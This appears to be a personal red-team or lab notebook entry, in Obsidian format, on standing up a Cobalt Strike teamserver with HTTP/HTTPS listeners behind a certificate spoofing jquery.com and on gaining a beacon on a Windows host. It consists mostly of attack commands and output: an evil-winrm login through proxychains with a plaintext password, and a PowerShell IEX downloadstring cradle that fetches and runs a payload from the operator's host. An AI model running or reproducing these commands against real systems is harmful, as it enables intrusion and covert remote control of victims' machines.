### Teamserver setup
#cobalstrike #teamserver
```bash
┌──(kali㉿gobots)-[14Jun2024 16:42:32]-[/opt/cobaltstrike]
└─$ sudo ./teamserver 10.10.14.39 'passphrase' /opt/internal/PwnLibrary/custom-cobalt/Profiles/custom.profile

[*] Checking TeamServerImage for local update
[*] Verifying MD5 Message Digest for TeamServerImage
TeamServerImage: OK
[*] Will use existing X509 certificate and keystore (for SSL)
[*] Starting teamserver
[*] Team Server Version: 4.9.1 Licensed
[*] Setting 'https.protocols' system property: SSLv3,SSLv2Hello,TLSv1,TLSv1.1,TLSv1.2,TLSv1.3
[+] I see you're into threat replication. /opt/internal/PwnLibrary/custom-cobalt/Profiles/custom.profile loaded.
[*] Loading keystrokes.
[*] Loaded 0 keystrokes.
[*] Loading screenshots.
[*] Loaded 0 screenshots.
[*] Loading downloads.
[*] Loaded 0 downloads.
[*] Loading Windows error codes.
[*] Windows error codes loaded
[*] Loading hosted files
[*] Loaded 0 servers with hosted items
[*] Loading beacons
[*] Loaded 0 beacons
[+] Team server is up on 0.0.0.0:50050
[*] SHA256 hash of SSL cert is: 8816b2a754254578d05cfa552b67f20460df96152342e5b99416694ec3709e80
[*] Team server license expires 2024-10-31.
[*] Generating Payload: http -- Type: HTTP -- Arch: x86 -- Exit Function: Process -- System Call: None -- HTTP Library: wininet
[*] Generating Payload: http -- Type: HTTP -- Arch: x64 -- Exit Function: Process -- System Call: None -- HTTP Library: wininet
[+] Listener: http started!
Generating 2,048 bit RSA key pair and self-signed certificate (SHA256withRSA) with a validity of 365 days
        for: CN=jquery.com, OU=Certificate Authority, O=jQuery, L=, ST=, C=US
[*] Web Server will use user-specified SSL certifcate
[*] Generating Payload: https -- Type: HTTP -- Arch: x86 -- Exit Function: Process -- System Call: None -- HTTP Library: wininet
[*] Generating Payload: https -- Type: HTTP -- Arch: x64 -- Exit Function: Process -- System Call: None -- HTTP Library: wininet
[+] Listener: https started!
```
### Starting cobaltstrike server
#cobalstrike 
```bash
┌──(kali㉿gobots)-[14Jun2024 16:42:53]-[/opt/cobaltstrike]                                                                                                                                                   
└─$ sudo ./cobaltstrike    
```
#### Setup Listeners
#cobaltstrike #listeners
![[Pasted image 20240614125352.png]]
#### Generating Payloads
#cobalstrike #payloads 
![[Pasted image 20240614125517.png]]
##### Scripted Web Delivery Service
#cobalstrike 
![[Pasted image 20240614130355.png]]
##### Evil-WinRM login
#cobalstrike #evil-winrm 
```bash
proxychains evil-winrm  -i 172.16.0.2 -u calde_ldap -p 'CsAdlLDAPMoDeBrnd12!' 
```
##### Beacon
#cobalstrike #beacon 
```bash
*Evil-WinRM* PS C:\Users\calde_ldap\Documents> IEX ((new-object net.webclient).downloadstring('http://10.10.14.39:80/hacker'))
```
##### Initial Beacon
#cobaltstrike 
![[Pasted image 20240614130710.png]]

